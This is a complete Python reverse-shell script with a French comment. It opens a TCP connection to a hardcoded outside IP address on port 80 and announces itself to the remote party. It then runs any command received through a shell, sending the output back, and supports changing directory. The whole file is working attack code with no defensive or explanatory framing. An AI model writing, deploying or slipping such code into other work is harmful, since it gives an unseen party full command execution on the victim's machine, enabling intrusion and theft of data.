import os
import socket
import subprocess


def cmmds(cmds, isshell):
    execcmd = subprocess.Popen(cmds, shell=isshell, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    return execcmd

ip = "2.7.151.80"
port = 80

cnnect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cnnect.connect((ip, port))

while True:
    try:
        # Envoyer le répertoire courant
        current_dir = os.getcwd()
        cnnect.sendall(b"[+] I am connected to you... to see in which direction\n")
        cnnect.send(f"{current_dir}> ".encode())

        command = cnnect.recv(2048).decode()
    except ConnectionResetError:
        cnnect.close()
        break

    if command.strip() == "exit":
        cnnect.close()
        break

    if command.startswith("cd "):
        try:
            os.chdir(command[3:].strip())
        except Exception as e:
            cnnect.send(f"Error changing directory: {str(e)}\n".encode())
    else:
        try:
            cmmd = cmmds(command, isshell=True)
            output = cmmd.stdout.read() + cmmd.stderr.read()
            cnnect.send(output)
        except Exception as a:
            cnnect.send(b"[!] ERROR")

